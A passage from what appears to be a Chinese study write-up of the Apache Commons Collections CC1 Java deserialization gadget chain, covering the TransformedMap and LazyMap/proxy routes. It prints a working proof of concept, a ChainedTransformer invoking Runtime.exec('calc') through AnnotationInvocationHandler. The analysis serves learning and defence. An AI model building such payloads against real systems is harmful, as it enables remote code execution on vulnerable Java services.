+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;
+
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>{
+        <span class="hljs-keyword">super</span>(entry);
+        <span class="hljs-keyword">this</span>.parent = parent;
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>{
+        value = parent.checkSetValue(value);
+        <span class="hljs-keyword">return</span> entry.setValue(value);
+    }
+}
+</code></pre>
+<blockquote>
+<p>Java 中遍历 map 的其中一个方法，<a href="https://www.baeldung.com/java-map-entry" target="_blank">https://www.baeldung.com/java-map-entry</a>。</p>
+<p>As  <strong><em>Map.Entry</em> stores both the key and value together in one class, we get them both in a single operation</strong> .</p>
+</blockquote>
+<p>我们先尝试下通过 <strong>MapEntry</strong> 遍历来 <code>setValue</code> 能不能走到 <code>checkSetValue</code>，进而调用危险方法 <code>transform</code>。<a href="https://docs.oracle.com/javase/8/docs/api/java/util/Map.Entry.html" target="_blank">https://docs.oracle.com/javase/8/docs/api/java/util/Map.Entry.html</a></p>
+<p><strong>MapEntry</strong> <strong>遍历，通过 setValue 修改测试</strong></p>
+<pre><code class="lang-java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;Object, Object&gt;();
+
+hashMap.put(<span class="hljs-string">&quot;zhaocai&quot;</span>, <span class="hljs-string">&quot;mao&quot;</span>);
+hashMap.put(<span class="hljs-string">&quot;ff&quot;</span>, <span class="hljs-string">&quot;xn&quot;</span>);
+
+<span class="hljs-keyword">for</span> (Map.Entry entry : hashMap.entrySet()) {
+    entry.setValue(<span class="hljs-string">&quot;zhu&quot;</span>);
+}
+System.out.println(<span class="hljs-string">&quot;key zhaocai value is: &quot;</span> + hashMap.get(<span class="hljs-string">&quot;zhaocai&quot;</span>));
+System.out.println(<span class="hljs-string">&quot;key ff value is: &quot;</span> + hashMap.get(<span class="hljs-string">&quot;ff&quot;</span>));
+
+----------
+key zhaocai value is: zhu
+key ff value is: zhu
+
+Process finished with exit code <span class="hljs-number">0</span>
+</code></pre>
+<p><strong>MapEntry 遍历，通过 setValue 利用测试</strong></p>
+<pre><code class="lang-java">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>});
+<span class="hljs-comment">//invokerTransformer.transform(Runtime.getRuntime());</span>
+
+HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;Object, Object&gt;();
+hashMap.put(<span class="hljs-string">&quot;zhaocai&quot;</span>, <span class="hljs-string">&quot;mao&quot;</span>);
+
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, invokerTransformer);
+
+<span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) {
+    entry.setValue(Runtime.getRuntime()); <span class="hljs-comment">// 注意这里传进去的是 Runtime 对象</span>
+}
+System.out.println(<span class="hljs-string">&quot;key zhaocai value is: &quot;</span> + hashMap.get(<span class="hljs-string">&quot;zhaocai&quot;</span>));
+
+---------- 成功利用
+key zhaocai value is: java.lang.ProcessImpl@108c4c35
+
+Process finished with exit code <span class="hljs-number">0</span>
+</code></pre>
+<p><strong>Map 之间的继承关系</strong></p>
+<pre><code class="lang-java"><span class="hljs-number">1.</span> java.util.Map
+
+<span class="hljs-number">2.</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>
+
+3. <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapDecorator</span>
+
+4. <span class="hljs-title">public</span> <span class="hljs-title">class</span> <span class="hljs-title">TransformedMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span>
+</span></code></pre>
+<p><strong>到这里我们先总结一下思路：</strong>创建一个<strong>非空</strong>的 map 【这样调用为空的话就没法 setValue 了】--&gt; 接着通过 <code>TransformedMap.decorate</code> 方法来装饰这个 map，通过 TransformedMap 的构造函数将 <code>valueTransformer</code> 修改为  InvokerTransformer 的对象 <code>invokerTransformer</code>， --&gt; 最后通过 <code>Map.Entry</code> 遍历，用 setValue 来修改非空 map 的 value 值为<a href>想执行方法的对象</a>就可以执行这一部分的利用链。</p>
+<ul>
+<li><p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code></p>
+<p>--&gt;</p>
+</li>
+<li><p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p>
+<p>--&gt;</p>
+</li>
+<li><code>valueTransformer.transform(value)</code> -- 这里我们需要执行 exec 方法， value 就需要为 Runtime 对象。</li>
+</ul>
+<blockquote>
+<p>其实这一长串的构造就是为了连通 <code>readObject</code> 和 <code>InvokeTransformer#transform</code></p>
+</blockquote>
+<p>那么最后我们就继续看看有没有类的 readObject 方法直接调用（或者 invoke ）了 setValue 方法，没有的话可能需要多走一层甚至几层，直到反序列化的入口 readObject 方法。还是 Find Usages + 前人栽树大法直奔主题。【毕竟是分析学习，而不是利用链挖掘嘛】<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code></p>
+<p><img src="assets/image-20220928001552-ejmcdl3.png" alt="image">​</p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler 这个类是个默认修饰类型。</p>
+<ul>
+<li><strong>default</strong> (即默认，什么也不写）: 在同一包内可见【<strong>所以利用的时候要用反射获取</strong>】，不使用任何修饰符。使用对象：类、接口、变量、方法。<a href="https://www.runoob.com/java/java-modifier-types.html" target="_blank">https://www.runoob.com/java/java-modifier-types.html</a></li>
+</ul>
+<pre><code class="lang-java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span></span>{}
+</code></pre>
+<p><code>AnnotationInvocationHandler</code> 有一个唯一的构造函数</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 两个参数分别是注解类型和 Map 类型</span>
+AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {
+    <span class="hljs-keyword">this</span>.type = type;
+    <span class="hljs-keyword">this</span>.memberValues = memberValues;
+}
+</code></pre>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 方法</p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>
+    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>{
+    s.defaultReadObject();
+
+
+    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span>
+
+    AnnotationType annotationType = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">try</span> {
+        annotationType = AnnotationType.getInstance(type);
+    } <span class="hljs-keyword">catch</span>(IllegalArgumentException e) {
+        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span>
+        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);
+    }
+
+    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+
+
+    <span class="hljs-comment">// If there are annotation members without values, that</span>
+    <span class="hljs-comment">// situation is handled by the invoke method.</span>
+    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {
+        String name = memberValue.getKey();
+        Class&lt;?&gt; memberType = memberTypes.get(name);
+        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) {  <span class="hljs-comment">// i.e. member still exists</span>
+            Object value = memberValue.getValue();
+            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||
+                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) {
+                memberValue.setValue(
+                    <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(
+                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(
+                            annotationType.members().get(name)));
+            }
+        }
+    }
+}
+</code></pre>
+<p>通过反射创建 AnnotationInvocationHandler 对象，并调用 readObject 方法。</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 通过 InvokerTransformer 反射调用 exec 方法</span>
+InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>});
+<span class="hljs-comment">//invokerTransformer.transform(Runtime.getRuntime());</span>
+
+<span class="hljs-comment">// 创建一个 Map 并经过 TransformedMap.decorate 装饰</span>
+HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;Object, Object&gt;();
+hashMap.put(<span class="hljs-string">&quot;zhaocai&quot;</span>, <span class="hljs-string">&quot;mao&quot;</span>);
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, invokerTransformer);
+
+<span class="hljs-comment">// 反射获取 AnnotationInvocationHandler 实例对象，并进行反序列化</span>
+Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="hljs-comment">// 获取 Class 对象</span>
+<span class="hljs-comment">// 这里注意 AnnotationInvocationHandler 的构造方法是 default 修饰的，不能用 getConstructor 来获取。</span>
+Constructor annoInvHdlConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); <span class="hljs-comment">// 构造函数的参数类型</span>
+annoInvHdlConstructor.setAccessible(<span class="hljs-keyword">true</span>);
+Object annoInvHdlObj = annoInvHdlConstructor.newInstance(Override.class, transformedMap); <span class="hljs-comment">// 构造函数的参数值</span>
+
+<span class="hljs-comment">// 序列化、反序列化</span>
+Serializer.serialized(annoInvHdlObj, <span class="hljs-string">&quot;/src/test/resources/cc1.ser&quot;</span>);
+Deserializer.deserialized(<span class="hljs-string">&quot;/src/test/resources/cc1.ser&quot;</span>);
+</code></pre>
+<p>运行以上代码只是生成了序列化文件，反序列化并没有进行任何操作。</p>
+<p><img src="assets/image-20220928101832-dcurthd.png" alt="image">​</p>
+<p>通过 debug 可以看到 if 并不满足条件，并且 setValue 的值我们应该传入 Runtime 对象。</p>
+<ul>
+<li><p>满足 if 判断条件【<a href="https://www.yiibai.com/java/java-annotation-tutorial.html" target="_blank">Java 注解</a>】</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 获取注解的 memberTypes，本次传进去的 Override 注解的 memberTypes 为空，</span>
+Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
+Class&lt;?&gt; memberType = memberTypes.get(name);
+
+----------
+<span class="hljs-comment">// java.lang.annotation.Target</span>
+<span class="hljs-comment">// Target 注解存在属性 value</span>
+ElementType[] value();
+</code></pre>
+<p><img src="assets/image-20220930001442-ixpzofr.png" alt="image">​</p>
+<p><img src="assets/image-20220930001330-3nkhf3e.png" alt="image">​</p>
+<p><img src="assets/image-20220928162638-6u3zpkj.png" alt="image">​</p>
+<p><img src="assets/Snipaste_2022-09-30_08-33-03-20220930083355-ts9pohg.png" alt="Snipaste_2022-09-30_08-33-03">​</p>
+<blockquote>
+<p>SuppressWarnings、Target、Repeatable 和 Retention。</p>
+</blockquote>
+<p>修改后成功进入 if。</p>
+<p><img src="assets/image-20220928163214-cdey63m.png" alt="image">​</p>
+</li>
+<li>Runtime 类不可序列化问题 -- 【普通反射 --&gt; InvokerTransformer.transform 反射】获取 Runtime 对象，前面已经解决。</li>
+<li><p>执行，报错。发现还剩最后一个问题，<code>entry.setValue(Runtime.getRuntime());</code> 的值需要为 Runtime.getRuntime() 实例化对象，可是这里 setValue 的值并不可控。</p>
+<p><img src="assets/image-20221001002425-feexxdu.png" alt="image">​</p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>{
+    <span class="hljs-keyword">return</span> valueTransformer.transform(value);
+}
+
+现在是 ---------&gt; 怎么使 value == Runtime.class ?
+chainedTransformer.transform(Runtime.class);
+</code></pre>
+<pre><code class="lang-java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> org.apache.commons.collections.FunctorException: InvokerTransformer: The method <span class="hljs-string">&apos;getMethod&apos;</span> on <span class="hljs-string">&apos;class sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy&apos;</span> does not exist
+</code></pre>
+<p>【<strong>怎么在反序列化的时候传进去一个 Runtime 对象呢？</strong>】</p>
+<blockquote>
+<p>这里我们发现了 ConstantTransformer 这个类，它的 transform 方法永远返回一个固定值，一切都刚刚好。</p>
+</blockquote>
+<pre><code class="lang-java">    <span class="hljs-comment">/**
+     * Constructor that performs no validation.
+     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
+     * 
+     * <span class="hljs-doctag">@param</span> constantToReturn  the constant to return each time
+     */</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>{
+        <span class="hljs-keyword">super</span>();
+        iConstant = constantToReturn;
+    }
+
+    <span class="hljs-comment">/**
+     * Transforms the input by ignoring it and returning the stored constant instead.
+     * 
+     * <span class="hljs-doctag">@param</span> input  the input object which is ignored
+     * <span class="hljs-doctag">@return</span> the stored constant
+     */</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>{
+        <span class="hljs-keyword">return</span> iConstant;
+    }
+</code></pre>
+<p>那么我们只要修改 <code>iConstant</code> 为 <code>Runtime.class</code> 即可。【该类的构造函数】</p>
+<pre><code class="lang-java">Transformer [] transformers = <span class="hljs-keyword">new</span> Transformer[]{
+            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+            ...
+};
+
+----------&gt; 经过 TransformedMap.decorate 装饰后 
+valueTransformer.transform(value) 变成了 chainedTransformer.transform(value)
+----------&gt; 后面在 AnnotationInvocationHandler 类进行反序列 readObject 并满足一定条件的时候会调用 setValue 方法，在 setValue 的时候会进行 checkSetValue 调用
+----------&gt; 触发到 chainedTransformer.transform(value) 然后就会遍历 Transformer 数组调用对应的 transform 方法
+----------&gt; 对应 Transformer 数组
+iTransformers[i].transform(object); 
+----------&gt; 数组的第一个元素
+即 chainedTransformer[<span class="hljs-number">0</span>].transform(Runtime.class) 就是
+constantTransformer.transform() 并且在 <span class="hljs-keyword">new</span> ConstantTransformer 的时候已将 iConstant 的值设置为了 Runtime.class
+----------&gt;不管传进去的 value 是什么 constantTransformer.transform() 方法恒定返回 iConstant
+</code></pre>
+<p>所以这里是 <code>AnnotationTypeMismatchExceptionProxy</code> 对象并不影响。如图：</p>
+<p><img src="assets/image-20221001010428-lerqtse.png" alt="image">​</p>
+<p><img src="assets/image-20221001010225-m6khxsi.png" alt="image">​</p>
+<p><img src="assets/image-20221001010110-wslv10c.png" alt="image">​</p>
+</li>
+<li><p>所以最终 poc 为</p>
+<pre><code class="lang-java"><span class="hljs-comment">// 套娃了三次，搞成一个数组。通过 ChainedTransformer 遍历调用对应的 transform 方法。</span>
+        Transformer [] transformers = <span class="hljs-keyword">new</span> Transformer[]{
+            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>})
+        };
+
+        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span>
+
+        <span class="hljs-comment">// 这部分代码就是为了反序列化的时候触发 chainedTransformer.transform() 方法做准备。先装进去 Map 里面，值也改好了，但是还没触发到对应的 transform 方法。</span>
+        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;Object, Object&gt;();
+        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;mao&quot;</span>);
+        <span class="hljs-comment">// 通过 decorate 修改 valueTransformer 为可利用的类对象。如 valueTransformer.transform(value); --&gt; invokerTransformer.transform();</span>
+        Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, chainedTransformer);
+
+<span class="hljs-comment">//        // 通过 MapEntry#setValue 触发： setValue --&gt; checkSetValue --&gt; valueTransformer.transform(value) 【这里的 value 值就是 setValue 的值】</span>
+<span class="hljs-comment">//        for (Map.Entry entry : transformedMap.entrySet()) {</span>
+<span class="hljs-comment">//            entry.setValue(Runtime.class);</span>
+<span class="hljs-comment">//        }</span>
+<span class="hljs-comment">//        System.out.println(&quot;The key named value is: &quot; + hashMap.get(&quot;value&quot;));</span>
+
+        <span class="hljs-comment">// 触发 transform 方法，如 chainedTransformer.transform(Runtime.class);</span>
+        <span class="hljs-comment">// 反序列化的触发类：readObject 【满足一定条件】 --&gt; setValue --&gt; checkSetValue --&gt; valueTransformer.transform(value) 即 chainedTransformer.transform(Runtime.class) 完整的利用链</span>
+        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="hljs-comment">// 获取 Class 对象</span>
+        <span class="hljs-comment">// 这里注意 AnnotationInvocationHandler 的构造方法是 default 修饰的，不能用 getConstructor 来获取。</span>
+        Constructor annoInvHdlConstructor = clazz.getDeclaredConstructor(Class.class, Map.class); <span class="hljs-comment">// 构造函数的参数类型</span>
+        annoInvHdlConstructor.setAccessible(<span class="hljs-keyword">true</span>);
+        Object annoInvHdlObj = annoInvHdlConstructor.newInstance(Target.class, transformedMap); <span class="hljs-comment">// 构造函数的参数值</span>
+
+        <span class="hljs-comment">// 序列化、反序列化</span>
+        Serializer.serialized(annoInvHdlObj, <span class="hljs-string">&quot;/src/test/resources/cc1.ser&quot;</span>);
+        Deserializer.deserialized(<span class="hljs-string">&quot;/src/test/resources/cc1.ser&quot;</span>);
+</code></pre>
+</li>
+</ul>
+<h3 id="lazymap-利用链"><a name="lazymap-利用链" class="anchor-navigation-ex-anchor" href="#lazymap-利用链"><i class="fa fa-link" aria-hidden="true"></i></a><a href="https://commons.apache.org/proper/commons-collections/apidocs/org/apache/commons/collections4/map/LazyMap.html" target="_blank">LazyMap</a> 利用链</h3>
+<p><img src="assets/image-20221001201803-czzdzcw.png" alt="image">​</p>
+<blockquote>
+<p>LazyMap 会更加优雅美妙一点，用到的知识也会更多一点，再学习一波 Java 安全漫谈 amazing...</p>
+</blockquote>
+<pre><code class="lang-java"><span class="hljs-comment">// 生成序列化流</span>
+ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
+oos.writeObject(handler);
+oos.close();
+System.out.println(barr);
+
+<span class="hljs-comment">// 反序列化</span>
+ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span>
+ByteArrayInputStream(barr.toByteArray()));
+Object o = (Object)ois.readObject();
+</code></pre>
+<p>其实也差不多，我们需要在反序列化的时候通过 LazyMap 走到 InvokeTransformer.transform 方法。</p>
+<p>LazyMap 的装饰（构造）函数 <code>decorate</code></p>
+<p><img src="assets/image-20221001213840-j50mcge.png" alt="image">​</p>
+<p><img src="assets/image-20221001213834-fbar9j0.png" alt="image"></p>
+<p><img src="assets/image-20221001220911-xqbra78.png" alt="image"></p>
+<p>那么现在问题变成怎么在 readObject 的时候调用 LazyMap 的 get 方法呢？  <code>org.apache.commons.collections.map.LazyMap#get</code></p>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 中并没有直接调用 Map 的 get 方法。所以 ysoserial 找到了另一条路，AnnotationInvocationHandler 类的 <code>invoke</code> 方法有调用到 get：</p>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> </span>{
+        String member = method.getName(); <span class="hljs-comment">// 这里获取 member 值</span>
+        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+        <span class="hljs-comment">// Handle Object and Annotation methods</span>
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;
+            paramTypes[<span class="hljs-number">0</span>] == Object.class)
+            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);
+        <span class="hljs-keyword">assert</span> paramTypes.length == <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;toString&quot;</span>))
+            <span class="hljs-keyword">return</span> toStringImpl();
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))
+            <span class="hljs-keyword">return</span> hashCodeImpl();
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;annotationType&quot;</span>))
+            <span class="hljs-keyword">return</span> type;
+
+        <span class="hljs-comment">// Handle annotation member accessors</span>
+        Object result = memberValues.get(member); <span class="hljs-comment">// 这里，不同的 JDK 版本这个 invoke 函数可能会小有差异。并且 memberValues 就是 AnnotationInvocationHandler 构造函数传进去的 Map 对象</span>
+
+        <span class="hljs-keyword">if</span> (result == <span class="hljs-keyword">null</span>)
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(type, member);
+
+        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)
+            <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();
+
+        <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)
+            result = cloneArray(result);
+
+        <span class="hljs-keyword">return</span> result;
+}
+</code></pre>
+<p>现在问题又变成了怎么在反序列化的时候调用到 <code>AnnotationInvocationHandler#invoke</code> 呢？ysoserial 的作者想到的是利用 Java 的对象代理。【我还能说什么呢？这些人也太猛了吧。。。】什么是 Java 代理对象？P 牛写的很详细易懂了，这里我直接抄吧。</p>
+<ul>
+<li><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/reflect/Proxy.html" target="_blank">Proxy (Java Platform SE 7 ) (oracle.com)</a></li>
+<li><a href="https://javaguide.cn/java/basis/proxy.html#_1-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F" target="_blank">Java 代理模式详解 | JavaGuide</a></li>
+</ul>
+<blockquote>
+<p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似 PHP 的魔术方法 __call ，我们需要用到 <code>java.reflect.Proxy</code> ：Proxy.newProxyInstance 的<strong>第一个参数是 ClassLoader</strong>，我们用默认的即可；第二个参数是我们<strong>需要代理的对象集合</strong>；第三个参数是一个实现了 <code>InvocationHandler</code> 接口的对象，里面包含了具体代理的逻辑。</p>
+</blockquote>
+<p><code>java.lang.reflect.Proxy#newProxyInstance</code></p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(
+    ClassLoader loader,
+    Class&lt;?&gt;[] interfaces,
+    InvocationHandler h
+)</span> <span class="hljs-keyword">throws</span> IllegalArgumentException </span>{}
+</code></pre>
+<p><code>ExampleInvocationHandler</code></p>
+<pre><code class="lang-java"><span class="hljs-keyword">package</span> zha0cai;
+
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
+<span class="hljs-keyword">import</span> java.lang.reflect.Method;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>{
+    <span class="hljs-keyword">protected</span> Map map;
+
+    <span class="hljs-comment">// 构造函数</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span> </span>{
+        <span class="hljs-keyword">this</span>.map = map;
+    }
+
+    <span class="hljs-comment">// ExampleInvocationHandler 类实现了 invoke 方法，作用是在监控到调用的方法名是 get 的时候，返回一个特殊字符串 Hacked Object</span>
+    <span class="hljs-comment">// 代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。</span>
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>{ <span class="hljs-comment">// 重写实现的 invoke 方法</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>)) {
+            System.out.println(<span class="hljs-string">&quot;Hook method: &quot;</span> + method.getName());
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hacked Object&quot;</span>;
+        }
+
+        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);
+    }
+}
+</code></pre>
+<p><code>ProxyTest</code> ，我们可以发现，虽然我向 Map 放入的 hello 值为 world，但我们获取到的结果却是 &quot;Hacked Object&quot;</p>
+<pre><code class="lang-java"><span class="hljs-keyword">package</span> zha0cai;
+
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
+<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyTest</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+        InvocationHandler handler = <span class="hljs-keyword">new</span> ExampleInvocationHandler(<span class="hljs-keyword">new</span> HashMap());
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] {Map.class}, handler);
+        proxyMap.put(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);
+        System.out.println();
+
+        String result = (String) proxyMap.get(<span class="hljs-string">&quot;hello&quot;</span>);
+        System.out.println(result);
+    }
+}
+==========
+D:\Java\jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0_20</span>\bin\java.exe ...
+Hook method: get
+Hacked Object
+
+Process finished with exit code <span class="hljs-number">0</span>
+</code></pre>
+<blockquote>
+<p>我们回看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，会发现实际上这个类实际就
+是一个 <code>InvocationHandler</code>，我们如果将这个对象用 Proxy 进行代理，那么在 <code>readObject</code> 的时候，<strong>只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中（这是动态代理类的一个特性），十分美妙。</strong></p>
+</blockquote>
+<p><code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p>
+<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> </span>{
+        String member = method.getName();
+        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+        <span class="hljs-comment">// Handle Object and Annotation methods</span>
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;
+            paramTypes[<span class="hljs-number">0</span>] == Object.class)
+            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);
+        <span class="hljs-keyword">assert</span> paramTypes.length == <span class="hljs-number">0</span>;
